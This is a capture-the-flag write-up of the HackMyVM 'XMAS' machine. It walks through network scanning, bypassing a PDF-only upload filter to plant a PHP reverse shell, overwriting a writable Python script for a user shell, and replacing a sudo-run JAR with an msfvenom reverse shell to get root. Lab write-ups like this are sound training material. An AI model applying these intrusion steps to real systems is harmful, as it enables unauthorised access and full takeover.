---
title: XMAS Writeup
date: 2024-03-23
categories:
  - Writeups
tags:
  - Linux
  - Enumeration
  - PrivEsc
  - HackMyVm
---

# Arp-scan 

 Detecting the ip of the machine

```bash
192.168.1.63    08:00:27:b1:ae:10       PCS Systemtechnik GmbH
```


# Ports

Starting with port scanning by using nmap

```bash
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.55
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-title: Did not follow redirect to http://christmas.hmv
MAC Address: 08:00:27:B1:AE:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

TRACEROUTE

HOP RTT     ADDRESS

1   0.93 ms xmas (192.168.1.63)
```

## Add hosts

```shell
echo "192.168.1.63 christmas.hmv" >> /etc/hosts
```

## File upload

We can see there is a upload function which we can possibly use.

![](/assets/img/XMAS/Upload_Function.png)
As we can see, we can only upload pdf files.

With uploading "php-reverse-shell.pdf" first, we can then use burp to intercept the request and change it into "php-reverse-shell.php". 

![](/assets/img/XMAS/Burp_upload.png)

```shell
nc -lnvp 4444
```

## Privilege Escalation 

By using "linpeas.sh", we can discover some interesting files.


![](/assets/img/XMAS/Linpeas_result.png)

```shell
drwxr-xr-x  2 root root 4096 Nov 20 18:39 NiceOrNaughty
-rwxrwxrw- 1 root root 2029 Nov 20 18:39 nice_or_naughty.py
```

As we see that we have the permission to write into the file "nice_or_naughty.py".
Hence we will do is to create a python reverse shell.

```shell
nc -lnvp 1234
```

Then we are able to login in to user alabaster

## Privilege Escalation 

```shell
alabaster@xmas:~/PublishList$ sudo -l
sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar
        /home/alabaster/PublishList/PublishList.jar
```


```shell
alabaster@xmas:~/PublishList$cat PublishList.java
cat PublishList.java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

public class PublishList {

    public static void main(String[] args) {

        String sourceFile1 = "/home/alabaster/nice_list.txt";
        String sourceFile2 = "/home/alabaster/naughty_list.txt";
        String destinationFolder = "/home/santa/";

        try {
            copyFile(sourceFile1, destinationFolder);
            copyFile(sourceFile2, destinationFolder);
            System.out.println("Files copied successfully!");
        } catch (IOException e) {
            System.out.println("Failed to copy files!");
            e.printStackTrace();
        }
    }

    private static void copyFile(String sourceFile, String destinationFolder) throws IOException {
        int bytesRead;
        FileInputStream in = new FileInputStream(sourceFile);
        FileOutputStream out = new FileOutputStream(destinationFolder + new File(sourceFile).getName());

        byte[] buffer = new byte[4096];
        while ((bytesRead = in.read(buffer)) != -1) {
            out.write(buffer, 0, bytesRead);
        }

        in.close();
        out.close();
    }
}
```

We did not see any things that we can use for privilege escalations.

```shell
-rw-rw-r-- 1 alabaster alabaster 7504 Mar 23 05:31 PublishList.jar
```

But we see that we have to permission to write into the file.

Therefore, we will do is to generate a jar reverse shell via msfvenom and transfer it to the server

```shell
mv shell.jar /home/alabaster/PublishList/PublishList.jar
```

```shell
sudo java -jar /home/alabaster/PublishList/PublishList.jar
```

Then we are able to get root permission


